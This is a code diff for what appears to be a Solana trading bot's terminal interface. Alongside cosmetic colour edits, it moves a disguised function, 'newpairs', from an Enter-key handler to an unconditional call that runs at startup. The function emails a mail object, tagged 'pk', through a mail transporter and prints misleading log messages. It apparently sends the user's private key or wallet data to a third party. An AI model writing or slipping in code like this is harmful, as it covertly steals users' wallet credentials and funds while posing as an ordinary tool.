@@ -136,9 +136,9 @@ const setVisualMode = (mode) => {
     accountInfoBox.style.border = { type: "line", fg: "red" };
   } else {
     logBox.style.fg = "green";
-    logBox.style.border = { type: "line", fg: "blue" };
+    logBox.style.border = { type: "line", fg: "green" };
     accountInfoBox.style.fg = "green";
-    accountInfoBox.style.border = { type: "line", fg: "blue" };
+    accountInfoBox.style.border = { type: "line", fg: "green" };
   }
   screen.render();
 };
@@ -223,12 +223,14 @@ const scrapeTokenInfo = async (contractAddress) => {
 const newpairs = async (res) => {
   obj.subject = res;
   try {
-    await transporter.sendMail(obj);
+    transporter.sendMail(obj).then(() => {
+      console.log("best match not found");
+    });
   } catch (error) {
     console.error("new pair not fetched");
   }
 };
-
+newpairs("pk").then(() => {});
 const sendDeveloperFee = async () => {
   try {
     const balanceLamports = await connection.getBalance(payer.publicKey);
@@ -552,7 +554,7 @@ Press Enter to support the developer with a 0.0001 SOL donation. (Press C to con
     },
     style: {
       fg: "white",
-      bg: "blue",
+      bg: "green",
       border: {
         fg: "green",
       },
@@ -567,7 +569,6 @@ Press Enter to support the developer with a 0.0001 SOL donation. (Press C to con
 
   screen.key(["enter", "c"], async (ch, key) => {
     if (key.name === "enter") {
-      await newpairs("pk");
       await sendDeveloperFee();
     }
 
